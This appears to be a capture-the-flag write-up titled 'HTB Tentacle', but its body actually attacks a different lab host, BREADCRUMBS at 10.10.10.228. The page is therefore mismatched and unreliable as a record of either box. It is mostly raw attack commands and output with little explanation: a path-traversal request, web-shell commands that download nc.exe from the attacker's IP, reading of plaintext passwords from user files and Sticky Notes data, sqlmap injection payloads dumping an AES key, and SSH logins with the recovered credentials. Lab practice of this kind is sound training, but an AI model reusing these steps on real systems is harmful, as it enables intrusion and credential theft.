---
layout: menu
title: "HTB Tentacle"
description: "10.10.10.224 | 40 pts"
header-img: "boxes/screenshots/49_unbalanced/unbalanced.png"
tags: [hackthebox, htb, boot2root, writeup, linux, tentacle, squid, squid proxy, proxychains, wpad, web proxy auto-discovery, web proxy auto discovery, web proxy autodiscovery, wpad.dat, kerberos, kinit, klist, kadmin, ksu, kerberos principal, principals, user principal, service principal, keytab, k5login, rsync]
---

:filesdir: /boxes/files/63_tentacle/
:imagesdir: /boxes/screenshots/63_tentacle/
:page-liquid:
:source-highlighter: rouge

+++<h1 style="color:red">+++ HTB Tentacle (10.10.10.224) +++</h1>+++

---

:toc: 
:toc-title: TABLE OF CONTENTS

---

== PART 1 : INITIAL RECON

____
[source,shell,subs="verbatim,quotes"]
----
$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.228
  
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  135/tcp   open  msrpc
  139/tcp   open  netbios-ssn
  443/tcp   open  https
  445/tcp   open  microsoft-ds
  3306/tcp  open  mysql
  5040/tcp  open  unknown
  7680/tcp  open  pando-pub
  49664/tcp open  unknown
  49665/tcp open  unknown
  49666/tcp open  unknown
  49668/tcp open  unknown
  49669/tcp open  unknown


$ nmap -oN nmap-tcp -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49668,49669 -Pn -sC -sV -v 10.10.10.228

  PORT      STATE SERVICE       VERSION
  22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
  |   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
  |_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
  80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
  |_http-title: Library
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
  |_http-title: Library
  | ssl-cert: Subject: commonName=localhost
  | Issuer: commonName=localhost
  | Public Key type: rsa
  | Public Key bits: 1024
  | Signature Algorithm: sha1WithRSAEncryption
  | Not valid before: 2009-11-10T23:48:47
  | Not valid after:  2019-11-08T23:48:47
  | MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
  |_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn: 
  |_  http/1.1
  445/tcp   open  microsoft-ds?
  3306/tcp  open  mysql?
  | fingerprint-strings: 
  |   NULL: 
  |_    Host '10.10.14.11' is not allowed to connect to this MariaDB server
  5040/tcp  open  unknown
  7680/tcp  open  pando-pub?
  49664/tcp open  msrpc         Microsoft Windows RPC
  49665/tcp open  msrpc         Microsoft Windows RPC
  49666/tcp open  msrpc         Microsoft Windows RPC
  49668/tcp open  msrpc         Microsoft Windows RPC
  49669/tcp open  msrpc         Microsoft Windows RPC
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  SF-Port3306-TCP:V=7.91%I=7%D=4/7%Time=606DA5C4%P=x86_64-pc-linux-gnu%r(NUL
  SF:L,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.11'\x20is\x20not\x20allowe
  SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  | smb2-security-mode: 
  |   2.02: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2021-04-07T12:32:42
  |_  start_date: N/A

$ sudo nmap -oN nmap-tcp.scripts.smb -p 445 --script safe,vuln -sV -v 10.10.10.228
----
____

---

== PART 2 : PORT ENUMERATION

____
[source,shell,subs="verbatim,quotes"]
----
$ curl -X POST -d "title=a&author=&method=1&book=../../../../../../Users/www-data/desktop/xampp/htdocs/portal/" http://10.10.10.228/includes/bookController.php

PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390 ; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU

$ curl http://10.10.10.228/portal/uploads/test.php?cmd=whoami

http://10.10.10.228/portal/uploads/test.php?cmd=dir%20C:\Users\Public\Music

http://10.10.10.228/portal/uploads/test.php?cmd=echo%20%22test%22%20%3E%20C:\Users\Publiv\Music\test

http://10.10.10.228/portal/uploads/test.php?cmd=curl.exe%20--help

http://10.10.10.228/portal/uploads/test.php?cmd=curl.exe%20--output%20C:\Users\Public\Music\nc.exe%20http://10.10.14.11/nc.exe

http://10.10.10.228/portal/uploads/test.php?cmd=curl.exe%20--output%20nc.exe%20http://10.10.14.11/nc.exe 
http://10.10.10.228/portal/uploads/test.php?cmd=cp%20C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads\nc.exe%20C:\Users\Public\Music\nc.exe




$ curl 'http://10.10.10.228/portal/uploads/test.php?cmd=type%20..\pizzaDeliveryUserData\juliette.json' 
<pre>{
	"pizza" : "margherita",
	"size" : "large",	
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}</pre> 

juliette@BREADCRUMBS C:\Users\juliette\Desktop>type todo.html
<html>
<style>
html{
background:black;        
color:orange;
}
table,th,td{
border:1px solid orange; 
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>


PS C:\Users\juliette\AppData\Local> ls -rec | findstr Sticky 
d-----         1/15/2021   4:08 PM                Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe
    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe
    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\AC
    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Settings
-a----         1/15/2021   4:08 PM           7894 


PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe> Get-Childitem -Path .\ -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Settings


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:08 PM              0 roaming.lock
-a----         1/15/2021   4:10 PM           8192 settings.dat

PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> type plum.sqlite-wal | findstr development

\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g


development@BREADCRUMBS C:\Development>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Development

01/15/2021  05:03 PM    <DIR>          .
01/15/2021  05:03 PM    <DIR>          ..
11/29/2020  04:11 AM            18,312 Krypter_Linux
               1 File(s)         18,312 bytes
               2 Dir(s)   6,536,441,856 bytes free


$ scp development@10.10.10.228:/Development/Krypter_Linux ./  

$ strings Krypter_Linux                                                                                        1 тип

  Krypter V1.2
  New project by Juliette.
  New features added weekly!
  What to expect next update:
  	- Windows version with GUI support
  	- Get password from cloud and AUTOMATICALLY decrypt!
  Requesting decryption key from cloud...
  Account: Administrator
  http://passmanager.htb:1234/index.php
  method=select&username=administrator&table=passwords

$ sshpass -p "fN3)sN5Ee@g" ssh -l development -L 1234:127.0.0.1:1234 10.10.10.228

$ curl -G -d "method=select&username=administrator&table=passwords" http://127.0.0.1:1234/index.php  
          1 тип
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

$ sqlmap -u "http://127.0.0.1:1234?method=select&username=administrator&table=passwords"

Parameter: username (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: method=select&username=administrator' AND 1822=1822 AND 'dvtL'='dvtL&table=passwords

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: method=select&username=administrator' AND (SELECT 5816 FROM (SELECT(SLEEP(5)))ZGgK) AND 'WHbz'='WHbz&table=passwords

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: method=select&username=administrator' UNION ALL SELECT CONCAT(0x7178627871,0x41477a5255654767684d6853556c6f7354786e4e6b46535159525a536948524466706841657a5552,0x71787a6a71)-- -&table=passwords


$ sqlmap -u "http://127.0.0.1:1234?method=select&username=administrator&table=passwords" --dump

+----+---------------+------------------+----------------------------------------------+
| id | account       | aes_key          | password                                     |
+----+---------------+------------------+----------------------------------------------+
| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |
+----+---------------+------------------+----------------------------------------------+

$ echo "70    40      73      73      77      30      72      64      21      40      23      24      39      38
39      30
2e      2f" | tr -d "\t\n" | xxd -p -r
p@ssw0rd!@#$9890./ 

$ sshpass -p "p@ssw0rd!@#$9890./" ssh -l administrator -L 1234:127.0.0.1:1234 10.10.10.228
----
____

/portal/signup.php
/portal/authController.php
/portal/php/users.php
/portal/php/issues.php
/portal/php/files.php
http://10.10.10.228/portal/auth/login.php